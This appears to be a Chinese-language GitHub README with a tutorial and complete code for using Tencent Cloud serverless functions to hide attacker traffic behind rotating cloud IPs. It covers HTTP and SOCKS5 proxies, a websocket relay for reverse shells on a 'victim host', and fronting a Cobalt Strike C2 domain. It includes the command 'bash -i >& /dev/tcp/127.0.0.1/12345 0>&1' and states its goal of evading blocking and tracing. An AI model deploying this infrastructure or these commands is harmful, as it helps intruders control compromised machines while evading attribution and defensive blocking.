# flowHiding_SCF
基于Serverless的流量隐匿（httpProxy、socks5Proxy、reverseShellProxy、C2DomainHidding）

# 前言

## Serverless

无服务器（Serverless）不是表示没有服务器，而表示当您在使用 Serverless 时，您无需关心底层资源，也无需登录服务器和优化服务器，只需关注最核心的代码片段，即可跳过复杂的、繁琐的基本工作。核心的代码片段完全由事件或者请求触发，平台根据请求自动平行调整服务资源。Serverless 拥有近乎无限的扩容能力，空闲时，不运行任何资源。代码运行无状态，可以轻易实现快速迭代、极速部署。

![](https://files.mdnice.com/user/23371/322479b3-af88-47b4-9093-d4ed8abab59b.png)


## SCF

腾讯云云函数（Serverless Cloud Function，SCF）是腾讯云为企业和开发者们提供的无服务器执行环境，帮助您在无需购买和管理服务器的情况下运行代码， 是实时文件处理和数据处理等场景下理想的计算平台。 您只需使用 SCF 平台支持的语言编写核心代码并设置代码运行的条件，即可在腾讯云基础设施上弹性、安全地运行代码。

<iframe src="https://cloud.tencent.com/edu/learning/quick-play/2937-54929?source=gw.doc.media&withPoster=1¬ip=1"></iframe>

**可利用云函数（SCF）构建Http/socks代理,可通过 API 网关触发器进行触发，通过API接受来自客户端的数据，出发网关触发器将请求转发出去（类似于SSRF）。这时候目标机收到的请求来源为腾讯云服务器，而非个人名下服务器。**

**每个用户在每个地区只有5个随机出口IP，但会根据您的命名空间以及选择的私有网络不同而变化**

**因此我们可以通过创建不同区域的云函数，获取更多出口IP，以此来实现封无可封，查无可查。**

# HTTP代理

### 2.1 新建云函数：https://console.cloud.tencent.com/scf/list

![](https://files.mdnice.com/user/23371/3ac0ab9a-e850-4d11-9833-f54007165ed0.png)

### 2.2 环境信息配置

![](https://files.mdnice.com/user/23371/5d555203-456e-4714-a92e-af9eef8663a8.png)

### 2.3 脚本部署

```python
# -*- coding: utf8 -*-#
import requests, json, base64, sys
import pickle

def main_handler(event: dict, context: dict):
    data = event["body"]
    kwargs = json.loads(data)
    kwargs['data'] = base64.b64decode(kwargs['data'])
    try:
        req = requests.request(**kwargs, verify=False, allow_redirects=False)
        serializedReq = pickle.dumps(req)
        return {
            "isBase64Encoded": False,
            "statusCode": 200,
            "headers": {},#不要强制格式哦，会报错
            "body": base64.b64encode(serializedReq).decode("utf-8"),
        }
    except Exception as e:#可以以集群方式返回结果抛出异常
        exc_type, exc_value, exc_traceback = sys.exc_info()
        return {
            "isBase64Encoded": False,
            "statusCode": 200,
            "headers": {},
            "body": str(exc_value).encode().decode("utf-8")#base64.b64encode(bytes(str(exc_value),'utf-8')).decode("utf-8"),
        }
```

- 安装python脚本用到的数据序列化/反序列化三方组件：**pip3 install pickle-mixin**

![](https://files.mdnice.com/user/23371/e4856c1f-6359-42f6-94df-087200d95fc7.png)

### 2.4 高级配置-超时时间设置最大

![](https://files.mdnice.com/user/23371/6b763fbb-e9fb-49bb-bf99-8a53d4ecd78c.png)

### 2.5 触发器配置-选定由API网关触发

![](https://files.mdnice.com/user/23371/9c267a8e-b346-4bf1-ab5d-2fad949c3d9f.png)

### 2.3 设置API网关路径，并获取最终API网管访问地址

https://console.cloud.tencent.com/apigateway/service

![](https://files.mdnice.com/user/23371/ac8b6ce6-c730-4c03-9369-ea45135335cd.png)

![](https://files.mdnice.com/user/23371/8ea77bfb-cb51-4d28-965e-497197beec22.png)

### 2.4 本地流量转发

本地运行mitmdump加载配置脚本py，将本地流量转发至API网关。

- mitmdump安装

```pip3 install mitmproxy```

- mitmdump证书安装（用于访问https）

  - **方式一**：默认路径：C:/Users/当前用户/.mitmproxy/mitmproxy-ca-cert.cer 进行安装 (文件夹默认隐藏，需要设置显示)

![](https://files.mdnice.com/user/23371/36ef7871-61f9-42f6-8a9a-b22eb7e42e40.png)

  - **方式二（推荐）**：线上下载并安装：

![](https://files.mdnice.com/user/23371/9ffee014-bd77-42c5-9a6e-7e1b2d6a2f4b.png)

- 编写mitmdump的配置脚本py：**mitmproxyConfig.py**

```python
# -*- coding: utf8 -*-#
import json,random,base64
import pickle
from typing import List
from urllib.parse import urlparse
import mitmproxy

scf_servers: List[str] = ["http://service-nt0li2x2-1306719530.hk.apigw.tencentcs.com:80"]


def request(flow: mitmproxy.http.HTTPFlow):
    scfServer = random.choice(scf_servers)
    r = flow.request
    headers=dict(r.headers)
    headers.update({"Connection": "close"})#设置短连接
    data = {
        "method": r.method,
        "url": r.pretty_url,
        "headers": dict(headers),#dict(r.headers),
        "cookies": dict(r.cookies),
        "params": dict(r.query),
        "data": base64.b64encode(r.raw_content).decode("ascii"),
    }

    flow.request = flow.request.make(
        "POST",
        url=scfServer,
        content=json.dumps(data),
        headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, compress",
            "Accept-Language": "en-us;q=0.8",
            "Cache-Control": "max-age=0",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
            "Connection": "close",
            "Host": urlparse(scfServer).netloc,
        },
    )


def response(flow: mitmproxy.http.HTTPFlow):
    if flow.response.status_code != 200:
        mitmproxy.ctx.log.warn("Error")
        mitmproxy.ctx.log.warn(flow.response.text)

    if flow.response.status_code == 401:
        flow.response.headers = mitmproxy.net.http.Headers(content_type="text/html;charset=utf-8")
        return

    if flow.response.status_code == 433:
        mitmproxy.ctx.log.warn("SCF连接超时！")

    if flow.response.status_code == 200:
        body = flow.response.content.decode("utf-8")
        #print(body)
        try:
            resp = pickle.loads(base64.b64decode(body))
            req = flow.response.make(
                status_code=resp.status_code,
                headers=dict(resp.headers),
                content=resp.content,
            )
        except:
            resp = body
            req = flow.response.make(
                status_code=400,
                headers={"Content-Type":"text/html;charset=utf-8"},
                content=resp,
            )
        flow.response = req
```

经反复测试，转发数据需要经过base64编码进行传输，否则强转utf-8会报错：```'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte```

亦尝试decode('utf-8','ignore')忽略不能转部分，但是发现存在的地方比较多，如图下，炸裂，顾采用base64加密成byte传输，最后base64解密成utf-8。

![](https://files.mdnice.com/user/23371/8785a2c9-c5ff-4730-9c7b-bb28aab8fa84.png)

- **运行命令：** mitmdump -s mitmproxyConfig.py -p 8080 --no-http2

 ```VPS上运行时需要添加 --set block_global=false```

- **设置代理** 设置http/https代理方式略过（浏览器、脚本、扫描工具等都可以挂http代理）

此时所有http/https流量就走的是我们SCF分配的随机IP

![](https://files.mdnice.com/user/23371/5fafeb91-c044-44fb-9d9c-d8b45e66f6aa.png)

- 同样我们的py脚本也可以使用此代理：

![](https://files.mdnice.com/user/23371/79cfc7ae-4df9-4e95-9fb8-aef507e6f6f3.png)

- 随机分配的IP可以丢微步看看暴露有啥信息

![](https://files.mdnice.com/user/23371/e3e68dd2-d4c6-4856-a1ac-c6d5e7f801d2.png)

# socks5代理

```SOCK5代理协议可以说是对HTTP代理协议的加强，它不仅是对HTTP协议进行代理，而是对所有向外的连接进行代理，是没有协议限制的。也就是说，只要你向外连接，它就给你代理，并不管你用的是什么协议，极大的弥补了HTTP代理协议的不足，使得很多在HTTP代理情况下无法使用的网络软件都可以使用```

![](https://files.mdnice.com/user/23371/e897c855-a42a-404e-a9ee-83c075a8780e.png)

### 3.1 SCF构建（同http代理SCF构建方式）

- SCF脚本如下：

```python
import json
import socket
import select

bridge_ip = "http://xxx.xxx.xxx.xxx/" #vps地址
bridge_port = 53203


def main_handler(event, context):
    data = json.loads(event["body"])
    out = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    out.connect((data["host"], data["port"]))

    bridge = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bridge.connect((bridge_ip, bridge_port))
    bridge.send(data["uid"].encode("ascii"))

    while True:
        readable, _, _ = select.select([out, bridge], [], [])
        if out in readable:
            data = out.recv(4096)
            bridge.send(data)
        if bridge in readable:
            data = bridge.recv(4096)
            out.send(data)
```

### 3.2 VPS部署socksClient（注：Python>=3.8）

- bridge.py

```python
#pyName:bridge.py
import asyncio

from utils import print_time
from models import Conn, uid_socket


async def scf_handle(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    bridge = Conn("Bridge", reader, writer)
    uid = await bridge.read(4)
    uid = uid.decode("ascii")
    client = uid_socket[uid]
    bridge.target = client.target
    bridge_addr, _ = bridge.writer.get_extra_info("peername")
    print_time(f"Tencent IP:{bridge_addr} <=> {client.target} established")

    await socks5_forward(client, bridge)


async def socks5_forward(client: Conn, target: Conn):
    async def forward(src: Conn, dst: Conn):
        while True:
            try:
                data = await src.read(4096)
                if not data:
                    break
                await dst.write(data)
            except RuntimeError as e:
                print_time(f"RuntimeError occured when connecting to {src.target}")
                print_time(f"Direction: {src.role} => {dst.role}")
                print(e)
            except ConnectionResetError:
                print_time(f"{src.add} sends a ConnectionReset")
                pass

            await asyncio.sleep(0.01)

    tasks = [forward(client, target), forward(target, client)]
    await asyncio.gather(*tasks)

```

- models.py

```python
#pyName:models.py
import asyncio
from typing import Union
from collections import OrderedDict

import aiohttp


class Conn:
    def __init__(
        self,
        role: str,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ) -> None:
        self.target = None
        self.role = role
        self.reader = reader
        self.writer = writer

    async def read(self, size: int):
        return await self.reader.read(size)

    async def write(self, data: Union[str, bytes]):
        self.writer.write(data)
        await self.writer.drain()

    def close(self):
        self.writer.close()


class LRUDict(OrderedDict):
    def __init__(self, capacity):
        self.capacity = capacity
        self.cache = OrderedDict()

    def get(self, key):
        value = self.cache.pop(key)
        self.cache[key] = value
        return value

    def set(self, key, value):
        if key in self.cache:
            self.cache.pop(key)
        elif len(self.cache) == self.capacity:
            self.cache.popitem(last=True)
        self.cache[key] = value


class Request:
    def __init__(self):
        self._session = None

    async def init_session(self):
        self._session = aiohttp.ClientSession()

    async def request(self, method, url, bypass_cf=False, **kwargs):
        await self._session.request(method=method, url=url, **kwargs)

    async def post(self, url, **kwargs):
        return await self.request("POST", url, **kwargs)

    async def close(self):
        await self._session.close()


http = Request()
uid_socket = LRUDict(150)
```

- utils.py

```python
#pyName:
import sys
import asyncio
import argparse
from datetime import datetime, timezone, timedelta


timezone(timedelta(hours=8))


def print_time(data):
    print(f'{datetime.now().strftime("%Y-%m-%d %H:%M:%S")} {data}')


def parse_error(errmsg):
    print("Usage: python " + sys.argv[0] + " [Options] use -h or --help for help")
    sys.exit()


def parse_args():
    parser = argparse.ArgumentParser(description="SCF Socks5 Proxy Server")
    parser.error = parse_error

    parser.add_argument(
        "-u", "--scf-url", type=str, help="API Gate Way URL", required=True
    )
    parser.add_argument(
        "-l",
        "--listen",
        default="0.0.0.0",
        metavar="ip",
        help="Bind address to listen, default to 0.0.0.0",
    )
    parser.add_argument(
        "-sp",
        "--socks-port",
        type=int,
        help="Port accept connections from client",
        required=True,
    )
    parser.add_argument(
        "-bp",
        "--bridge-port",
        type=int,
        help="Port accept connections from SCF",
        required=True,
    )
    parser.add_argument("--user", type=str, help="Authentication username")
    parser.add_argument("--passwd", type=str, help="Authentication password")
    args = parser.parse_args()
    return args


def cancel_task(msg):
    print_time(f"[ERROR] {msg}")
    task = asyncio.current_task()
    task.cancel()

```

- socks5.py

```python
#pyName:socks5.py
import asyncio
import argparse
from socket import inet_ntoa
from functools import partial

import uvloop
import shortuuid

from bridge import scf_handle
from models import Conn, http, uid_socket
from utils import print_time, parse_args, cancel_task


async def socks_handle(
    args: argparse.Namespace, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
):
    client = Conn("Client", reader, writer)

    await socks5_auth(client, args)
    remote_addr, port = await socks5_connect(client)

    client.target = f"{remote_addr}:{port}"
    uid = shortuuid.ShortUUID().random(length=4)
    uid_socket[uid] = client

    data = {"host": remote_addr, "port": port, "uid": uid}
    await http.post(args.scf_url, json=data)


async def socks5_auth(client: Conn, args: argparse.Namespace):
    ver, nmethods = await client.read(2)

    if ver != 0x05:
        client.close()
        cancel_task(f"Invalid socks5 version: {ver}")

    methods = await client.read(nmethods)

    if args.user and b"\x02" not in methods:
        cancel_task(
            f"Unauthenticated access from {client.writer.get_extra_info('peername')[0]}"
        )

    if b"\x02" in methods:
        await client.write(b"\x05\x02")
        await socks5_user_auth(client, args)
    else:
        await client.write(b"\x05\x00")


async def socks5_user_auth(client: Conn, args: argparse.Namespace):
    ver, username_len = await client.read(2)
    if ver != 0x01:
        client.close()
        cancel_task(f"Invalid socks5 user auth version: {ver}")

    username = (await client.read(username_len)).decode("ascii")
    password_len = ord(await client.read(1))
    password = (await client.read(password_len)).decode("ascii")

    if username == args.user and password == args.passwd:
        await client.write(b"\x01\x00")
    else:
        await client.write(b"\x01\x01")
        cancel_task(
            f"Wrong user/passwd connection from {client.writer.get_extra_info('peername')[0]}"
        )


async def socks5_connect(client: Conn):
    ver, cmd, _, atyp = await client.read(4)
    if ver != 0x05:
        client.close()
        cancel_task(f"Invalid socks5 version: {ver}")
    if cmd != 1:
        client.close()
        cancel_task(f"Invalid socks5 cmd type: {cmd}")

    if atyp == 1:
        address = await client.read(4)
        remote_addr = inet_ntoa(address)
    elif atyp == 3:
        addr_len = await client.read(1)
        address = await client.read(ord(addr_len))
        remote_addr = address.decode("ascii")
    elif atyp == 4:
        cancel_task("IPv6 not supported")
    else:
        cancel_task("Invalid address type")

    port = int.from_bytes(await client.read(2), byteorder="big")

    # Should return bind address and port, but it's ok to just return 0.0.0.0
    await client.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
    return remote_addr, port


async def main():
    args = parse_args()
    handle = partial(socks_handle, args)

    if not args.user:
        print_time("[ALERT] Socks server runs without authentication")

    await http.init_session()
    socks_server = await asyncio.start_server(handle, args.listen, args.socks_port)
    print_time(f"SOCKS5 Server listening on: {args.listen}:{args.socks_port}")
    await asyncio.start_server(scf_handle, args.listen, args.bridge_port)
    print_time(f"Bridge Server listening on: {args.listen}:{args.bridge_port}")

    try:
        await socks_server.serve_forever()
    except asyncio.CancelledError:
        await http.close()


if __name__ == "__main__":
    uvloop.install()
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print_time("[INFO] User stoped server")

```
- requirements
```requirements.txt
aiohttp==3.7.4.post0
async-timeout==3.0.1
attrs==20.3.0
chardet==4.0.0
idna==3.1
multidict==5.1.0
shortuuid==1.0.1
typing-extensions==3.7.4.3
uvloop==0.15.2
yarl==1.6.3

```
- ```python3 -m venv .venv```

- ```source .venv/bin/activate```

- ```pip3 install -r requirements.txt```

![](https://files.mdnice.com/user/23371/74139de4-3a98-4e03-b831-9efefe6398ab.png)

- 开启VPS转发服务：

![](https://files.mdnice.com/user/23371/7b075485-003a-4f96-93dc-f4ecba4e61a7.png)

```python3 socks5.py -u "https://service-xxx.sh.apigw.tencentcs.com/release/xxx" -bp 53203 -sp 53201 --user test --passwd test```

```python3 socks5.py -u API 网关提供的地址 -bp 监听来自云函数连接的端口 -sp SOCKS5 代理监听的端口 --user  SOCKS5 服务器对连接进行身份验证 --passwd  SOCKS5 服务器对连接进行身份验证```

# 反弹Shell

当客户端有消息发出时，会先传递给 API 网关，再由 API 网关触发云函数执行。当服务端云函数要向客户端发送消息时，会先由云函数将消息 POST 到 API 网关的反向推送链接，再由 API 网关向客户端完成消息的推送。具体的实现架构如下：

![](https://files.mdnice.com/user/23371/fef28144-3b3f-422a-8b2a-bd09baae21b0.png)

## **因此我们可以利用websocket进行socks5代理反弹Shell**

![](https://files.mdnice.com/user/23371/2f371ac7-64f8-45da-8c9b-53747ba04b5c.png)

## 项目配置

### 数据库配置
本项目需要一个允许外部连接的 MySQL 数据库。数据库配置语句如下：
```sql
create database SCF;
use SCF;
create table Connections (
    ConnectionID varchar(128) NOT NULL,
    Date datetime,
    is_user tinyint
)
```

修改 src 文件夹内所有文件中的如下变量
```
db_host = 数据库 host
db_port = 数据库端口
db_user = 数据库用户
db_pass = 数据库密码

push_back_host = 等后续配置 API 网关后填写
```

### 函数配置
1. 参照 [HTTP 代理配置] 新建三个自定义函数，分别命名为 register, transmission, delete。

- register.py

```python
pyName:register.py
# -*- coding: utf8 -*-
import pytz
import datetime
import requests
import pymysql.cursors


push_back_host = ""
db_host = ""
db_user = ""
db_pass = ""
db_port = 123

db = "SCF"
db_table = "Connections"
tz = pytz.timezone("Asia/Shanghai")


def send(connectionID, data):
    retmsg = {
        "websocket": {
            "action": "data send",
            "secConnectionID": connectionID,
            "dataType": "text",
            "data": data,
        }
    }
    requests.post(push_back_host, json=retmsg)


def close_ws(connectionID):
    msg = {"websocket": {"action": "closing", "secConnectionID": connectionID}}
    requests.post(push_back_host, json=msg)


def record_connectionID(connectionID):
    try:
        conn = pymysql.connect(
            host=db_host,
            user=db_user,
            password=db_pass,
            port=db_port,
            db=db,
            charset="utf8",
            cursorclass=pymysql.cursors.DictCursor,
        )
        with conn.cursor() as cursor:
            sql = f"use {db}"
            cursor.execute(sql)
            time = datetime.datetime.now(tz).strftime("%Y-%m-%d %H:%M:%S")
            sql = f"insert INTO {db_table} (`ConnectionID`, `is_user`, `Date`) VALUES ('{str(connectionID)}', 0, '{time}')"
            cursor.execute(sql)
            conn.commit()
    except Exception as e:
        send(connectionID, f"[Error]: {e}")
        close_ws(connectionID)
    finally:
        conn.close()


def main_handler(event, context):
    if "requestContext" not in event.keys():
        return {"errNo": 101, "errMsg": "not found request context"}
    if "websocket" not in event.keys():
        return {"errNo": 102, "errMsg": "not found web socket"}

    connectionID = event["websocket"]["secConnectionID"]
    retmsg = {
        "errNo": 0,
        "errMsg": "ok",
        "websocket": {"action": "connecting", "secConnectionID": connectionID},
    }
    record_connectionID(connectionID)
    return retmsg
```

- transmission.py

```
#pyName:transmission.py
# -*- coding: utf8 -*-
from os import close
import pytz
import requests
import pymysql.cursors


push_back_host = ""
db_host = ""
db_user = ""
db_pass = ""
db_port = 123
PASSWORD = "test"


db = "SCF"
db_table = "Connections"
tz = pytz.timezone("Asia/Shanghai")


def send(connectionID, data):
    retmsg = {
        "websocket": {
            "action": "data send",
            "secConnectionID": connectionID,
            "dataType": "text",
            "data": data,
        }
    }
    requests.post(push_back_host, json=retmsg)


def close_ws(connectionID):
    msg = {"websocket": {"action": "closing", "secConnectionID": connectionID}}
    requests.post(push_back_host, json=msg)


def get_connectionIDs(conn):
    with conn.cursor() as cursor:
        sql = f"use {db}"
        cursor.execute(sql)
        sql = f"select * from {db_table}"
        cursor.execute(sql)
        result = cursor.fetchall()
        connectionIDs = {c["ConnectionID"]: c["is_user"] for c in result}
    return connectionIDs


def update_user_type(conn, connectionID):
    with conn.cursor() as cursor:
        sql = f"use {db}"
        cursor.execute(sql)
        sql = f"update {db_table} set is_user=True where ConnectionID='{connectionID}'"
        cursor.execute(sql)
        conn.commit()


def main_handler(event, context):
    if "websocket" not in event.keys():
        return {"errNo": 102, "errMsg": "not found web socket"}
    data = event["websocket"]["data"].strip()
    current_connectionID = event["websocket"]["secConnectionID"]

    if data == "close":
        send(current_connectionID, "[INFO] current connection closed")
        close_ws(current_connectionID)
        return

    if data == "help":
        msg = """Commands
        auth PASSWORD - provide a password to set current connection to be a user
        close - close curren websocket connection
        closeall - close all websocket connections
        help - show this help message
        """
        send(current_connectionID, msg)
        return

    conn = pymysql.connect(
        host=db_host,
        user=db_user,
        password=db_pass,
        port=db_port,
        db=db,
        charset="utf8",
        cursorclass=pymysql.cursors.DictCursor,
    )
    connectionIDs = get_connectionIDs(conn)

    if data[:5] == "auth ":
        try:
            password = data.split()[1]
        except IndexError:
            password = None
        if password == PASSWORD:
            send(current_connectionID, "[INFO] AUTH SUCCESS")
            update_user_type(conn, current_connectionID)
        else:
            send(current_connectionID, "[ERROR] AUTH FAILED")
    if data == "closeall":
        send(current_connectionID, "[INFO] all connections closed")
        for ID in connectionIDs.keys():
            close_ws(ID)
        return

    is_current_user = connectionIDs.pop(current_connectionID)
    for ID, is_user in connectionIDs.items():
        if is_current_user:
            send(ID, data)
        elif is_user:
            send(ID, data)

    return "send success"
```

- delete.py

```python
#pcName:delete.py
# -*- coding: utf8 -*-
import pytz
import pymysql.cursors


push_back_host = ""
db_host = ""
db_user = ""
db_pass = ""
db_port = 123

db = "SCF"
db_table = "Connections"
tz = pytz.timezone("Asia/Shanghai")


def delete_connectionID(connectionID):
    conn = pymysql.connect(
        host=db_host,
        user=db_user,
        password=db_pass,
        port=db_port,
        db=db,
        charset="utf8",
        cursorclass=pymysql.cursors.DictCursor,
    )
    with conn.cursor() as cursor:
        sql = f"use {db}"
        cursor.execute(sql)
        sql = f"delete from {db_table} where ConnectionID ='{connectionID}'"
        cursor.execute(sql)
        conn.commit()


def main_handler(event, context):
    if "websocket" not in event.keys():
        return {"errNo": 102, "errMsg": "not found web socket"}

    connectionID = event["websocket"]["secConnectionID"]
    delete_connectionID(connectionID)
    return event
```

2. 进入 [API 网关配置](https://console.cloud.tencent.com/apigateway/service)，新建如下配置服务

![](https://files.mdnice.com/user/23371/17038dab-c5ae-403c-927b-50fc538e1556.png)

3. 新建 API，前端类型选择 WS，其余默认，进入下一步
4. 开启设置注册函数、清理函数。后端类型，函数，后端超时时间分别配置为如下：

![](https://files.mdnice.com/user/23371/33cb442e-34c1-4528-a967-e15ca210092f.png)

5. 点击立即完成，发布服务
6. 点击生成的 api，进入信息展示页面获取如下信息，将推送地址填入文件中的 `push_back_host` 变量。

![](https://files.mdnice.com/user/23371/9393b1bb-be22-4b7e-afd7-252e4b3520f7.jpg)

7. 修改 transmission.py 中的 `PASSWORD` 变量，该变量将用于客户端连接 ws 后将连接认证为用户。
8. 分别复制三个文件的内容到对应的云函数中并部署。


## 具体利用步骤：

### 5.1 上传/远程下载websocat工具到受害主机

### 5.2 受害主机执行工具转发端口 ``` websocat -E --text tcp-l:127.0.0.1:12345 ws://API网关地址 ```

### 5.3 反弹shell到本地端口 ``` bash -i >& /dev/tcp/127.0.0.1/12345 0>&1 ```

### 5.4 攻击者连接 ws://API网关地址 ,通过云函数进行消息中转

# C2域名隐藏

1. 进行API网管添加：https://console.cloud.tencent.com/apigateway/service?rid=1

![](https://files.mdnice.com/user/23371/dfad00f6-0370-49bd-ad6c-911ff952d6b4.png)

2. 自定义API名称，点击下一步

![](https://files.mdnice.com/user/23371/5fe587b7-967d-4cab-8806-c8257aa90092.png)

3. 点击下一步，进行后台配置选择后台为公网URL/IP

![](https://files.mdnice.com/user/23371/93a5865e-0bca-417c-8857-902b74401e5c.png)

4. CS监听器配置

![](https://files.mdnice.com/user/23371/0498dc31-c25e-484f-a271-abdc424673f0.png)

